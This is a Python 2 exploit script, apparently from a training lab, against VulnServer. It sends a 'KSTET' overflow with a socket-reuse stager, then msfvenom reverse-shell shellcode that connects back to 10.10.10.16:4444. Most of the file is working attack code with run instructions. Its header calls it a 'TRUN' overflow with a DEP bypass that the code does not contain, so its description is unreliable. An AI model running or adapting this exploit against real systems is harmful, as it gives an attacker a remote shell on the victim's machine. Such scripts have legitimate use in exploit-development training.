#!/usr/bin/env python                                                                    
"""                                                                                      
Description: VulnServer "TRUN" Buffer Overflow w/ DEP Bypass (limited use-case)
Author: Cody Winkler                                                                     
Contact: @c2thewinkler (twitter)                                                         
Date: 1/26/2020                                                                          
Tested On: Windows XP SP2 x86 (EN)
                                            
[+] Usage: python expoit.py <IP> <PORT>
                                            
$ python exploit.py 127.0.0.1 9999
"""                                 

import socket    
import struct    
import sys
import time

host = sys.argv[1]
port = int(sys.argv[2])
                                            
jmp_esp = struct.pack("<I", 0x625011AF)                                                  
                                            
# nasm > add al, 0x6
# 00000000  0406              add al,0x6
# nasm > call eax                                                                        
# 00000000  FFD0              call eax
                                            
backjump = "\x04\x06\xFF\xD0"                                                            
                                            

"""                       
stack state on call ws2_32.recv:
Socket = 84                                
Buffer = 003D4AC0
BufSize = 1000
Flags = 0   

addr of ws2_32.recv = 00401953
"""

stager = "\x66\x83\xEC\x64"             # SUB SP,64     ; adjust stack to avoid corruption
stager += "\x33\xC0"                    # XOR EAX,EAX   ; zero EAX
stager += "\x33\xC9"                    # XOR ECX,ECX   ; zero ECX
stager += "\x80\xC5\x04"                # ADD CH,4      ; ECX=0x400 (1024)
stager += "\x54"                        # PUSH ESP      ;
stager += "\x58"                        # POP EAX       ; Move stack pointer to EAX
stager += "\x66\x83\xC0\x60"            # ADD AX,60     ; Setup Buffer for end of A's
stager += "\x52"                        # PUSH EDX      ; Flags=0
stager += "\x51"                        # PUSH ECX      ; BufSize=1024
stager += "\x50"                        # PUSH EAX      ; Buffer=Addr of end of A's
stager += "\x53"                        # PUSH EBX      ; SocketDescriptor already in EBX so no need to recalculate
stager += "\xB8\x90\x2C\x25\x40"        # MOV EAX,40252C90 ; Setup EAX for ws2_32.recv
stager += "\xC1\xE8\x08"                # SHR EAX,8     ; Correct EAX
stager += "\xFF\xD0"                    # CALL EAX ; <JMP.&WS2_32.recv>

# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.16 LPORT=4444 -e x86/shikata_ga_nai -b '\x00' -f python
# x86/shikata_ga_nai succeeded with size 351 (iteration=0)

shellcode =  b""
shellcode += b"\xb8\x35\xfe\x29\x15\xd9\xf6\xd9\x74\x24\xf4\x5a\x29"
shellcode += b"\xc9\xb1\x52\x31\x42\x12\x83\xc2\x04\x03\x77\xf0\xcb"
shellcode += b"\xe0\x8b\xe4\x8e\x0b\x73\xf5\xee\x82\x96\xc4\x2e\xf0"
shellcode += b"\xd3\x77\x9f\x72\xb1\x7b\x54\xd6\x21\x0f\x18\xff\x46"
shellcode += b"\xb8\x97\xd9\x69\x39\x8b\x1a\xe8\xb9\xd6\x4e\xca\x80"
shellcode += b"\x18\x83\x0b\xc4\x45\x6e\x59\x9d\x02\xdd\x4d\xaa\x5f"
shellcode += b"\xde\xe6\xe0\x4e\x66\x1b\xb0\x71\x47\x8a\xca\x2b\x47"
shellcode += b"\x2d\x1e\x40\xce\x35\x43\x6d\x98\xce\xb7\x19\x1b\x06"
shellcode += b"\x86\xe2\xb0\x67\x26\x11\xc8\xa0\x81\xca\xbf\xd8\xf1"
shellcode += b"\x77\xb8\x1f\x8b\xa3\x4d\xbb\x2b\x27\xf5\x67\xcd\xe4"
shellcode += b"\x60\xec\xc1\x41\xe6\xaa\xc5\x54\x2b\xc1\xf2\xdd\xca"
shellcode += b"\x05\x73\xa5\xe8\x81\xdf\x7d\x90\x90\x85\xd0\xad\xc2"
shellcode += b"\x65\x8c\x0b\x89\x88\xd9\x21\xd0\xc4\x2e\x08\xea\x14"
shellcode += b"\x39\x1b\x99\x26\xe6\xb7\x35\x0b\x6f\x1e\xc2\x6c\x5a"
shellcode += b"\xe6\x5c\x93\x65\x17\x75\x50\x31\x47\xed\x71\x3a\x0c"
shellcode += b"\xed\x7e\xef\x83\xbd\xd0\x40\x64\x6d\x91\x30\x0c\x67"
shellcode += b"\x1e\x6e\x2c\x88\xf4\x07\xc7\x73\x9f\x2d\x12\x71\x4f"
shellcode += b"\x5a\x20\x85\x7e\xc6\xad\x63\xea\xe6\xfb\x3c\x83\x9f"
shellcode += b"\xa1\xb6\x32\x5f\x7c\xb3\x75\xeb\x73\x44\x3b\x1c\xf9"
shellcode += b"\x56\xac\xec\xb4\x04\x7b\xf2\x62\x20\xe7\x61\xe9\xb0"
shellcode += b"\x6e\x9a\xa6\xe7\x27\x6c\xbf\x6d\xda\xd7\x69\x93\x27"
shellcode += b"\x81\x52\x17\xfc\x72\x5c\x96\x71\xce\x7a\x88\x4f\xcf"
shellcode += b"\xc6\xfc\x1f\x86\x90\xaa\xd9\x70\x53\x04\xb0\x2f\x3d"
shellcode += b"\xc0\x45\x1c\xfe\x96\x49\x49\x88\x76\xfb\x24\xcd\x89"
shellcode += b"\x34\xa1\xd9\xf2\x28\x51\x25\x29\xe9\x61\x6c\x73\x58"
shellcode += b"\xea\x29\xe6\xd8\x77\xca\xdd\x1f\x8e\x49\xd7\xdf\x75"
shellcode += b"\x51\x92\xda\x32\xd5\x4f\x97\x2b\xb0\x6f\x04\x4b\x91"

payload = stager
payload += "\x41"*(70-len(stager))
payload += jmp_esp
payload += backjump
payload += "\x42"*(300-len(payload))

buffer = "KSTET "
buffer += payload

def main():

    try:

        print "[+] Connecting to target"
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.recv(1024)
        s.send(buffer)
        print "[+] Sent payload with length: %d" % len(buffer)
        time.sleep(5)
        s.send(shellcode)
        print "[+] Sent stager with length: %d" % len(stager)
        s.close()

    except Exception, msg:

        print "[-] Something went wrong :("

main()
